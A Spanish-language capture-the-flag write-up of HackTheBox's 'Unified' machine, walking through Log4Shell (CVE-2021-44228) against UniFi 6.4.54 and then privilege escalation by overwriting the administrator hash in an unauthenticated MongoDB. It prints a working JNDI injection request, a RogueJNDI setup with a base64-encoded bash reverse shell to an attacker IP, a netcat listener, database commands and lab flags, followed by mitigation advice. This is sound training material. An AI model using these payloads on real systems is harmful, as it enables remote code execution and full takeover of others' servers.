Descripción de la Máquina

Unified es una máquina Linux del Starting Point de HackTheBox que ejecuta UniFi Network Application versión 6.4.54, un software de gestión de redes WiFi de Ubiquiti ampliamente desplegado en entornos corporativos. Esta versión utiliza Apache Log4j 2.x como framework de logging, haciéndola vulnerable a la vulnerabilidad crítica Log4Shell (CVE-2021-44228).

La cadena de explotación consta de dos fases: primero, inyección JNDI a través del campo remember en la petición de autenticación para obtener ejecución remota de código; segundo, manipulación directa de la base de datos MongoDB interna (sin autenticación) para resetear la contraseña del administrador y escalar a root.

🔴
CVE-2021-44228 — Log4Shell (CVSS 10.0): Vulnerabilidad de ejecución remota de código en Apache Log4j 2.x. Cuando Log4j procesa un mensaje de log que contiene una expresión JNDI (Java Naming and Directory Interface) como ${jndi:ldap://attacker/payload}, realiza una consulta LDAP al servidor del atacante y carga dinámicamente la clase Java que este le devuelve, permitiendo ejecución de código arbitrario en el contexto de la aplicación.
🌐
UniFi Network 6.4.54
Aplicación de gestión de redes WiFi de Ubiquiti. Puerto 8443 (HTTPS). Usa Log4j 2.x para logging de eventos de autenticación.
🍃
MongoDB (puerto 27117)
Base de datos NoSQL utilizada internamente por UniFi para almacenar configuración, usuarios y hashes. Sin autenticación habilitada.

Reconocimiento

El escaneo Nmap revela múltiples puertos asociados a la infraestructura UniFi. El portal web en el puerto 8443 muestra la versión exacta del software en el footer de la página de login, confirmando que se trata de la versión vulnerable.

💻 Nmap — Escaneo de puertos y servicios
nmap -sC -sV 10.129.96.49 # Resultado: PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 6789/tcp open ibm-db2-admin? 8080/tcp open http-proxy 8443/tcp open https-alt # ← UniFi portal (HTTPS) 8843/tcp open unknown 8880/tcp open cddbp-alt # Acceder al portal web: curl -sk https://10.129.96.49:8443/manage/account/login # Footer revela: UniFi Network 6.4.54
💡
¿Por qué tantos puertos? UniFi expone múltiples servicios: 8443 (portal HTTPS), 8080 (device inform), 8880 (portal HTTP guest), 8843 (HTTPS guest redirect), y 6789 (mobile speedtest). El puerto 8443 es el más crítico ya que maneja la autenticación.

Explotación — Log4Shell JNDI Injection

El vector de ataque se encuentra en la API de autenticación de UniFi (/api/login). Cuando se envía una petición POST con los campos de login, el valor del campo remember se registra en los logs de Log4j sin sanitización. Esto permite inyectar una expresión JNDI que fuerza al servidor a conectarse a un servidor LDAP malicioso controlado por el atacante.

🎯 Paso 1 — Interceptar petición de login con Burp Suite

Se intercepta la petición de login al portal UniFi. El campo remember es el punto de inyección — Log4j procesa su valor como parte del mensaje de log.

💻 Burp Suite — Petición interceptada
POST /api/login HTTP/1.1 Host: 10.129.96.49:8443 Content-Type: application/json { "username": "a", "password": "a", "remember": "${jndi:ldap://10.10.14.X:1389/o=tomcat}", "strict": true } # Respuesta del servidor: # HTTP/1.1 400 Bad Request # Pero Log4j YA procesó el campo remember... # y ejecutó la consulta JNDI al servidor LDAP del atacante
⚠️
¿Por qué funciona aunque el login falle? Log4j procesa las expresiones JNDI en el momento de escribir el log, antes de que la aplicación evalúe si las credenciales son válidas. El campo remember se loguea como parte del evento de autenticación, independientemente del resultado. Esto significa que no necesitamos credenciales válidas para explotar la vulnerabilidad.

🔧 Paso 2 — Configurar RogueJNDI como servidor LDAP malicioso

RogueJNDI actúa como servidor LDAP que, cuando recibe la consulta JNDI del servidor objetivo, devuelve una referencia a una clase Java maliciosa que ejecuta una reverse shell.

💻 Terminal 1 — Compilar y lanzar RogueJNDI
# Clonar y compilar RogueJNDI git clone https://github.com/veracode-research/rogue-jndi cd rogue-jndi && mvn package -q # Crear payload de reverse shell en Base64 # (necesario para evitar caracteres especiales en la línea de comandos Java) echo 'bash -c bash$IFS-i>&/dev/tcp/10.10.14.X/4444<&1' | base64 YmFzaCAtYyBiYXNoJElGUy1pPiYvZGV2L3RjcC8xMC4xMC4xNC5YLzQ0NDQ8JjEK # Lanzar RogueJNDI con el payload java -jar target/RogueJndi-1.1.jar \ --command "bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|bash" \ --hostname "10.10.14.X" # Salida de RogueJNDI: +-+-+-+-+-+-+-+-+-+ |R|o|g|u|e|J|n|d|i| +-+-+-+-+-+-+-+-+-+ Starting LDAP server on 0.0.0.0:1389 Sending LDAP ResourceRef result for o=tomcat with javax.el.ELProcessor

🐚 Paso 3 — Recibir reverse shell como unifi

💻 Terminal 2 — Listener Netcat
nc -lvnp 4444 # Tras reenviar la petición con el payload JNDI en Burp: Connection from 10.129.96.49:47832 unifi@unified:/usr/lib/unifi$ id uid=999(unifi) gid=999(unifi) # Obtener user flag cat /home/michael/user.txt 6ced1a6a89e666c0620cdb10262ba127

Escalada de Privilegios — MongoDB Password Reset

UniFi utiliza MongoDB como base de datos interna para almacenar toda su configuración, incluyendo los hashes de contraseña de los usuarios administradores. En esta máquina, MongoDB escucha en el puerto 27117 sin autenticación, lo que permite conectarse directamente y modificar los datos.

💡
¿Por qué MongoDB sin autenticación? En instalaciones por defecto de UniFi, MongoDB se configura para escuchar solo en localhost sin credenciales, ya que la aplicación UniFi se conecta directamente. Sin embargo, una vez que tenemos shell en la máquina, podemos acceder a MongoDB como si fuéramos la propia aplicación — heredando todos sus privilegios sobre la base de datos.

🍃 Paso 1 — Explorar la base de datos MongoDB

💻 Conexión a MongoDB — Base de datos ace
mongo --port 27117 # Listar bases de datos > show dbs ace 0.003GB # ← Base de datos principal de UniFi admin 0.000GB config 0.000GB local 0.000GB # Seleccionar la base de datos de UniFi > use ace switched to db ace # Buscar el usuario administrador > db.admin.find().forEach(printjson) { "_id" : ObjectId("61ce278f46e0fb0012d47ee4"), "name" : "administrator", "email" : "administrator@unified.htb", "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo...longSHA512hash...", "time_created" : NumberLong(1640898447), "last_site_name" : "default", "ubic_name" : "administrator" }

🔑 Paso 2 — Resetear contraseña del administrador

En lugar de intentar crackear el hash SHA-512, se genera uno nuevo con una contraseña conocida y se reemplaza directamente en MongoDB.

💻 Generación de hash y actualización en MongoDB
# Generar un hash SHA-512 con una contraseña conocida mkpasswd -m sha-512 Password1234 $6$pJlFNFYH$newnewnewhashhere... # Actualizar el hash del administrador en MongoDB > db.admin.update( {"name": "administrator"}, {$set: {"x_shadow": "$6$pJlFNFYH$newnewnewhashhere..."}} ) WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 }) ✓ Hash actualizado exitosamente

🏴 Paso 3 — Login como root vía SSH

Las credenciales del administrador de UniFi son compartidas con la cuenta root del sistema operativo. Una vez actualizado el hash, se puede iniciar sesión por SSH.

💻 SSH como root
# Login con la contraseña recién establecida ssh root@10.129.96.49 Password: Password1234 root@unified:~# id uid=0(root) gid=0(root) groups=0(root) # Obtener root flag cat /root/root.txt e50bc93c75b634e4b272d2f771c33681

Cadena de Ataque Completa

FASE 1 — Reconocimiento
🔍 Identificación de UniFi 6.4.54
Nmap revela múltiples puertos de la infraestructura UniFi. El portal web en 8443 muestra la versión 6.4.54, confirmada como vulnerable a Log4Shell.
FASE 2 — Explotación Inicial
💉 JNDI Injection en campo remember
Inyección del payload ${jndi:ldap://attacker:1389/o=tomcat} en el campo remember de la petición POST de login. Log4j procesa la expresión y conecta al servidor LDAP malicioso.
FASE 3 — Acceso Inicial
🐚 RogueJNDI → Reverse Shell
El servidor LDAP malicioso devuelve una referencia a una clase Java que ejecuta una reverse shell. Se obtiene acceso como usuario unifi (uid=999). User flag obtenida en /home/michael/user.txt.
FASE 4 — Post-Explotación
🍃 MongoDB sin autenticación
MongoDB corre en el puerto 27117 sin credenciales. Se accede a la base de datos ace y se localiza el hash SHA-512 del usuario administrator.
FASE 5 — Escalada
🔑 Password Reset → root SSH
Se genera un nuevo hash SHA-512 con mkpasswd y se reemplaza en MongoDB. Las credenciales del administrador de UniFi son compartidas con root del SO. SSH exitoso como root.

Recomendaciones de Mitigación

🔄 Actualizar Log4j
Actualizar Apache Log4j a versión 2.17.1+ que mitiga completamente CVE-2021-44228. Actualizar UniFi Network Application a la última versión disponible.
🔒 Autenticación MongoDB
Habilitar autenticación en MongoDB con credenciales fuertes. Limitar el acceso solo a la aplicación UniFi mediante bind a 127.0.0.1 con auth habilitado.
🛡️ WAF / Filtrado JNDI
Implementar un WAF que detecte y bloquee patrones de inyección JNDI como ${jndi:} en headers y body de peticiones HTTP.
🔐 Separar credenciales
No compartir credenciales entre la aplicación UniFi y el sistema operativo. Usar cuentas de servicio dedicadas con principio de mínimo privilegio.
